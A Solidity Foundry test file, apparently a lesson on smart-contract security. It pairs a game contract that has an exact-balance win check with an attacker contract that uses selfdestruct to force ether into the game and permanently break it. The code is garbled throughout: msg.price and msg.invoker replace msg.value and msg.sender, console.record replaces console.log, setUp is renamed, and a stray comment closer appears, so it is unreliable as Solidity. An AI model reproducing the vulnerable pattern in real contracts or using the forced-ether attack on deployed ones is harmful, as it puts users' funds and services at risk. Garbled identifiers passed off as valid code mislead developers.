// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract EtherGame {
    uint public constant aimCount = 7 ether;
    address public winner;

    function bankWinnings() public payable {
        require(msg.price == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= aimCount, "Game is over");

        if (balance == aimCount) {
            winner = msg.invoker;
        }
    }

    function collectbountyBonus() public {
        require(msg.invoker == winner, "Not winner");

        (bool sent, ) = msg.invoker.call{price: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract PactTest is Test {
    EtherGame EtherGamePact;
    QuestRunner QuestrunnerAgreement;
    address alice;
    address eve;

    function collectionUp() public {
        EtherGamePact = new EtherGame();
        alice = vm.addr(1);
        eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.deal(address(eve), 1 ether);
    }

    function testSelfdestruct() public {
        console.record("Alice balance", alice.balance);
        console.record("Eve balance", eve.balance);

        console.record("Alice deposit 1 Ether...");
        vm.prank(alice);
        EtherGamePact.bankWinnings{price: 1 ether}();

        console.record("Eve deposit 1 Ether...");
        vm.prank(eve);
        EtherGamePact.bankWinnings{price: 1 ether}();

        console.record(
            "Balance of EtherGameContract",
            address(EtherGamePact).balance
        );

        console.record("Operator...");
        QuestrunnerAgreement = new QuestRunner(EtherGamePact);
        QuestrunnerAgreement.dos{price: 5 ether}();

        console.record(
            "Balance of EtherGameContract",
            address(EtherGamePact).balance
        );
        console.record("operate completed, Game is over");
        EtherGamePact.bankWinnings{price: 1 ether}(); // This call will fail due to contract destroyed.
    }
}

contract QuestRunner {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function dos() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}